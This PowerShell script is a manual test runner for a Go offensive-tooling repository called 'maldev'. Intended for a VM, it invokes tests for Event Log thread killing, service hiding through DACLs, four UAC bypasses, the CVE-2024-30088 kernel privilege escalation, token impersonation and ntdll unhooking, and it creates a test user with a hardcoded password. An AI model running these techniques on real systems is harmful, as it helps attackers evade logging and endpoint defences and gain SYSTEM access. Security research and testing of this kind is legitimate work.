#Requires -RunAsAdministrator
<#
.SYNOPSIS
    Manual test runner for maldev intrusive/environment-specific tests.
    Run this script in a VM — NOT on your dev machine.

.DESCRIPTION
    This script runs all manual tests that require specific environments
    (admin rights, UAC, vulnerable OS, credentials). Each section can be
    run independently. The script handles setup, execution, verification,
    and cleanup for each test.

    Sections:
      phant0m     Kill Event Log service threads (silences logging)
      service     Hide/unhide a Windows service via DACL manipulation
      uacbypass   FODHelper, EventVwr, SilentCleanup, SLUI bypass techniques
      cve         CVE-2024-30088 kernel LPE (BSOD risk — snapshot first!)
      impersonate Thread token impersonation with credentials
      unhook      Restore ntdll.dll original bytes (undo EDR hooks)
      all         Run every section above in order

.PARAMETER Section
    Which test section to run. Default: all.

.PARAMETER TestUser
    Username for impersonation tests. Create first: net user maldevtest P@ssw0rd123! /add

.PARAMETER TestPass
    Password for impersonation tests.

.PARAMETER TestDomain
    Domain for domain-joined impersonation tests (optional).

.PARAMETER Help
    Show this help message and exit.

.NOTES
    Platform:  Windows 10/11 VM
    Requires:  Administrator privileges, Go toolchain, UAC enabled
    Location:  Run from the maldev repository root
    Safety:    ALWAYS run in a VM with a snapshot. Never on your dev machine.

.EXAMPLE
    .\testutil\manual-tests.ps1
    # Runs all sections.

.EXAMPLE
    .\testutil\manual-tests.ps1 -Section phant0m
    # Kills Event Log threads, verifies silence, restarts the service.

.EXAMPLE
    .\testutil\manual-tests.ps1 -Section service
    # Creates MaldevTestSvc, hides it via DACL, verifies, unhides, deletes.

.EXAMPLE
    .\testutil\manual-tests.ps1 -Section uacbypass
    # Runs 4 UAC bypass techniques. Must be in a NON-elevated shell for real effect.

.EXAMPLE
    .\testutil\manual-tests.ps1 -Section cve
    # Checks vulnerability, asks confirmation, runs exploit, spawns SYSTEM calc.

.EXAMPLE
    .\testutil\manual-tests.ps1 -Section impersonate -TestUser maldevtest -TestPass "P@ssw0rd123!"
    # Tests thread impersonation with provided credentials.

.EXAMPLE
    .\testutil\manual-tests.ps1 -Section unhook
    # Unhooks ntdll.dll and verifies clean syscall stubs.

.EXAMPLE
    Get-Help .\testutil\manual-tests.ps1 -Full
    # Shows this full help.
#>

param(
    [ValidateSet("all", "phant0m", "service", "uacbypass", "cve", "impersonate", "unhook")]
    [string]$Section = "all",

    # ── Credentials for impersonation tests ──
    # Create a local test user beforehand:
    #   net user maldevtest P@ssw0rd123! /add
    [string]$TestUser = "",
    [string]$TestPass = "",
    [string]$TestDomain = "",

    [Alias("h")]
    [switch]$Help
)

if ($Help) {
    Get-Help $MyInvocation.MyCommand.Path -Full
    exit 0
}

$ErrorActionPreference = "Continue"
$env:MALDEV_MANUAL = "1"
$env:MALDEV_INTRUSIVE = "1"

# ── Helpers ──────────────────────────────────────────────────────────

function Write-Section($title) {
    Write-Host "`n╔══════════════════════════════════════════════════════╗" -ForegroundColor Cyan
    Write-Host "║  $($title.PadRight(52))║" -ForegroundColor Cyan
    Write-Host "╚══════════════════════════════════════════════════════╝" -ForegroundColor Cyan
}

function Write-Step($msg) {
    Write-Host "  ► $msg" -ForegroundColor Yellow
}

function Write-Verify($msg) {
    Write-Host "  ✓ $msg" -ForegroundColor Green
}

function Write-Fail($msg) {
    Write-Host "  ✗ $msg" -ForegroundColor Red
}

function Write-Cleanup($msg) {
    Write-Host "  ♻ $msg" -ForegroundColor DarkGray
}

function Test-IsAdmin {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = [Security.Principal.WindowsPrincipal]$identity
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# ── Pre-flight checks ───────────────────────────────────────────────

if (-not (Test-IsAdmin)) {
    Write-Fail "This script must be run as Administrator."
    Write-Host "  Right-click PowerShell > Run as Administrator, then re-run." -ForegroundColor Gray
    exit 1
}

if (-not (Get-Command go -ErrorAction SilentlyContinue)) {
    Write-Fail "Go toolchain not found in PATH."
    exit 1
}

Write-Host "maldev Manual Test Runner" -ForegroundColor White
Write-Host "Section: $Section" -ForegroundColor Gray
Write-Host "Working directory: $(Get-Location)" -ForegroundColor Gray
Write-Host ""

# ══════════════════════════════════════════════════════════════════════
# SECTION 1: Phant0m — Event Log Thread Killer
# ══════════════════════════════════════════════════════════════════════

if ($Section -eq "all" -or $Section -eq "phant0m") {
    Write-Section "Phant0m — Event Log Thread Killer"

    # ── Setup ──
    Write-Step "Verifying Event Log service is running..."
    $svc = Get-Service EventLog -ErrorAction SilentlyContinue
    if ($svc.Status -ne "Running") {
        Write-Fail "Event Log service is not running. Start it first: net start EventLog"
    } else {
        Write-Verify "Event Log service is running (PID: $((Get-WmiObject Win32_Service -Filter "Name='EventLog'").ProcessId))"

        # ── Execute ──
        Write-Step "Running phant0m test..."
        go test ./evasion/phant0m/ -run TestKillEventLogThreads -v -timeout 30s 2>&1 | Write-Host

        # ── Verify ──
        Write-Step "Verifying event logging is silenced..."
        try {
            # Generate a test event
            Write-EventLog -LogName Application -Source "Application" -EventID 1000 -Message "maldev-test-probe" -ErrorAction Stop
            Start-Sleep -Seconds 2
            $events = wevtutil qe Application /c:1 /f:text 2>&1
            if ($events -match "maldev-test-probe") {
                Write-Fail "Event Log still writes events — phant0m may not have worked"
            } else {
                Write-Verify "Event Log appears silenced (probe event not found in latest)"
            }
        } catch {
            Write-Verify "Event Log write failed as expected (service threads killed)"
        }

        # ── Cleanup ──
        Write-Cleanup "Restarting Event Log service..."
        net stop EventLog 2>$null | Out-Null
        net start EventLog 2>$null | Out-Null
        $svcAfter = Get-Service EventLog -ErrorAction SilentlyContinue
        if ($svcAfter.Status -eq "Running") {
            Write-Verify "Event Log service restored"
        } else {
            Write-Fail "Event Log service did not restart — reboot the VM"
        }
    }
}

# ══════════════════════════════════════════════════════════════════════
# SECTION 2: Service Hiding — DACL Manipulation
# ══════════════════════════════════════════════════════════════════════

if ($Section -eq "all" -or $Section -eq "service") {
    Write-Section "Service Hiding — DACL Manipulation"

    $testSvcName = "MaldevTestSvc"

    # ── Setup ──
    Write-Step "Creating test service '$testSvcName'..."
    sc.exe create $testSvcName binPath= "C:\Windows\System32\svchost.exe -k netsvcs" start= demand 2>$null | Out-Null
    $svc = Get-Service $testSvcName -ErrorAction SilentlyContinue
    if ($svc) {
        Write-Verify "Test service created"
    } else {
        Write-Fail "Failed to create test service"
    }

    # ── Show original DACL ──
    Write-Step "Original DACL:"
    sc.exe sdshow $testSvcName 2>&1 | Write-Host

    # ── Execute: Hide (NATIF mode) ──
    Write-Step "Running HideService (NATIF mode)..."
    go test ./cleanup/service/ -run TestHideService -v -timeout 30s 2>&1 | Write-Host

    # ── Verify ──
    Write-Step "Verifying restrictive DACL..."
    $dacl = sc.exe sdshow $testSvcName 2>&1
    Write-Host "    DACL: $dacl" -ForegroundColor Gray
    if ($dacl -match "D:\(D;") {
        Write-Verify "Deny ACEs present — service is hidden"
    } else {
        Write-Fail "No deny ACEs found in DACL"
    }

    # ── Execute: Unhide ──
    Write-Step "Running UnHideService..."
    go test ./cleanup/service/ -run TestUnHideService -v -timeout 30s 2>&1 | Write-Host

    # ── Verify restored ──
    Write-Step "Verifying restored DACL..."
    $daclAfter = sc.exe sdshow $testSvcName 2>&1
    Write-Host "    DACL: $daclAfter" -ForegroundColor Gray
    Write-Verify "DACL restored"

    # ── Execute: Hide (SC_SDSET mode) ──
    Write-Step "Running HideService (SC_SDSET mode)..."
    go test ./cleanup/service/ -run TestHideServiceSCSdset -v -timeout 30s 2>&1 | Write-Host

    # ── Cleanup ──
    Write-Cleanup "Deleting test service..."
    sc.exe delete $testSvcName 2>$null | Out-Null
    $svcGone = Get-Service $testSvcName -ErrorAction SilentlyContinue
    if (-not $svcGone) {
        Write-Verify "Test service deleted"
    } else {
        Write-Fail "Test service still exists — delete manually: sc delete $testSvcName"
    }
}

# ══════════════════════════════════════════════════════════════════════
# SECTION 3: UAC Bypass — FODHelper, EventVwr, SilentCleanup, SLUI
# ══════════════════════════════════════════════════════════════════════

if ($Section -eq "all" -or $Section -eq "uacbypass") {
    Write-Section "UAC Bypass — 4 techniques"

    Write-Host "  NOTE: These tests must run as a NON-ELEVATED user with UAC enabled." -ForegroundColor Magenta
    Write-Host "  If you are already elevated (admin), the bypass has no effect to demonstrate." -ForegroundColor Magenta
    Write-Host "  For best results: open a non-elevated PowerShell and run:" -ForegroundColor Magenta
    Write-Host '    $env:MALDEV_MANUAL="1"; go test ./uacbypass/ -run TestFODHelper -v' -ForegroundColor White
    Write-Host ""

    $techniques = @("TestFODHelper", "TestEventVwr", "TestSilentCleanup", "TestSLUI")

    foreach ($test in $techniques) {
        Write-Step "Running $test..."
        go test ./uacbypass/ -run $test -v -timeout 30s 2>&1 | Write-Host

        # ── Verify ──
        Start-Sleep -Seconds 3
        $calcProc = Get-Process calc -ErrorAction SilentlyContinue
        if ($calcProc) {
            Write-Verify "$test: calc.exe spawned (PID: $($calcProc.Id))"
            # Show integrity level
            tasklist /FI "IMAGENAME eq calc.exe" /V 2>$null | Select-String "calc" | Write-Host

            # ── Cleanup ──
            Write-Cleanup "Killing calc.exe..."
            Stop-Process -Name "calc" -Force -ErrorAction SilentlyContinue
            # Also kill Calculator app (modern Windows)
            Stop-Process -Name "Calculator" -Force -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 1
        } else {
            # Modern Windows may launch "Calculator" instead of "calc"
            $calcApp = Get-Process Calculator -ErrorAction SilentlyContinue
            if ($calcApp) {
                Write-Verify "$test: Calculator.exe spawned (PID: $($calcApp.Id))"
                Write-Cleanup "Killing Calculator..."
                Stop-Process -Name "Calculator" -Force -ErrorAction SilentlyContinue
            } else {
                Write-Fail "$test: calc.exe not found — bypass may have failed"
            }
        }
    }
}

# ══════════════════════════════════════════════════════════════════════
# SECTION 4: CVE-2024-30088 — Kernel Exploit
# ══════════════════════════════════════════════════════════════════════

if ($Section -eq "all" -or $Section -eq "cve") {
    Write-Section "CVE-2024-30088 — Kernel LPE"

    # ── Version check (safe) ──
    Write-Step "Checking Windows version vulnerability..."
    go test ./exploit/cve202430088/ -run TestCheckVersion -v -timeout 30s 2>&1 | Write-Host

    # ── Ask before running exploit ──
    Write-Host ""
    Write-Host "  ⚠  WARNING: The exploit may cause a BSOD." -ForegroundColor Red
    Write-Host "  ⚠  Make sure you have a VM snapshot to restore." -ForegroundColor Red
    Write-Host ""
    $confirm = Read-Host "  Run the exploit? (yes/no)"

    if ($confirm -eq "yes") {
        Write-Step "Running exploit (timeout 360s)..."
        go test ./exploit/cve202430088/ -run TestRunExploit -v -timeout 360s 2>&1 | Write-Host

        # ── Verify ──
        Write-Step "Running exploit with calc.exe spawn..."
        go test ./exploit/cve202430088/ -run TestRunWithExecCalc -v -timeout 360s 2>&1 | Write-Host

        Start-Sleep -Seconds 3
        $calcProc = Get-Process calc, Calculator -ErrorAction SilentlyContinue
        if ($calcProc) {
            Write-Verify "calc.exe spawned as SYSTEM"
            tasklist /FI "IMAGENAME eq calc.exe" /V 2>$null | Write-Host
            Write-Cleanup "Killing calc.exe..."
            Stop-Process -Name "calc" -Force -ErrorAction SilentlyContinue
            Stop-Process -Name "Calculator" -Force -ErrorAction SilentlyContinue
        }

        # ── Cleanup ──
        Write-Cleanup "Token manipulation is in-memory only. Restart VM to fully clean up."
    } else {
        Write-Host "  Skipped." -ForegroundColor Gray
    }
}

# ══════════════════════════════════════════════════════════════════════
# SECTION 5: Impersonation — Thread Token Manipulation
# ══════════════════════════════════════════════════════════════════════

if ($Section -eq "all" -or $Section -eq "impersonate") {
    Write-Section "Impersonation — Thread Token"

    # ── Safe test first ──
    Write-Step "Running ThreadEffectiveTokenOwner (safe, no credentials)..."
    go test ./win/impersonate/ -run TestThreadEffectiveTokenOwner -v -timeout 10s 2>&1 | Write-Host

    # ── Credential-based tests ──
    if ($TestUser -and $TestPass) {
        $env:MALDEV_TEST_USER = $TestUser
        $env:MALDEV_TEST_PASS = $TestPass
        if ($TestDomain) {
            $env:MALDEV_TEST_DOMAIN = $TestDomain
        }

        Write-Step "Running ImpersonateThread with user '$TestUser'..."
        go test ./win/impersonate/ -run TestImpersonateThread -v -timeout 30s 2>&1 | Write-Host

        Write-Step "Running LogonUserW with user '$TestUser'..."
        go test ./win/impersonate/ -run TestLogonUserW -v -timeout 30s 2>&1 | Write-Host

        # ── Cleanup ──
        Remove-Item Env:\MALDEV_TEST_USER -ErrorAction SilentlyContinue
        Remove-Item Env:\MALDEV_TEST_PASS -ErrorAction SilentlyContinue
        Remove-Item Env:\MALDEV_TEST_DOMAIN -ErrorAction SilentlyContinue
        Write-Cleanup "Environment variables cleared"
    } else {
        Write-Host "  Skipping credential tests. To run:" -ForegroundColor Gray
        Write-Host "    1. Create a local test user:" -ForegroundColor Gray
        Write-Host '       net user maldevtest P@ssw0rd123! /add' -ForegroundColor White
        Write-Host "    2. Re-run with:" -ForegroundColor Gray
        Write-Host '       .\scripts\manual-tests.ps1 -Section impersonate -TestUser maldevtest -TestPass "P@ssw0rd123!"' -ForegroundColor White
        Write-Host "    3. Clean up after:" -ForegroundColor Gray
        Write-Host '       net user maldevtest /delete' -ForegroundColor White
    }
}

# ══════════════════════════════════════════════════════════════════════
# SECTION 6: Unhook — ntdll Restoration
# ══════════════════════════════════════════════════════════════════════

if ($Section -eq "all" -or $Section -eq "unhook") {
    Write-Section "Unhook — ntdll Restoration"

    Write-Step "Running ClassicUnhook + FullUnhook..."
    go test ./evasion/unhook/ -v -timeout 30s 2>&1 | Write-Host

    # ── Verify ──
    Write-Step "Verification is built into the tests (prologue byte check)"
    Write-Cleanup "No cleanup needed — unhooking restores original bytes"
}

# ══════════════════════════════════════════════════════════════════════
# Summary
# ══════════════════════════════════════════════════════════════════════

Write-Host ""
Write-Section "Done"
Write-Host "  All requested sections completed." -ForegroundColor Green
Write-Host "  Reminder: restart the VM if you ran exploit or phant0m tests." -ForegroundColor Yellow
Write-Host ""

# ── Global cleanup ──
Remove-Item Env:\MALDEV_MANUAL -ErrorAction SilentlyContinue
Remove-Item Env:\MALDEV_INTRUSIVE -ErrorAction SilentlyContinue
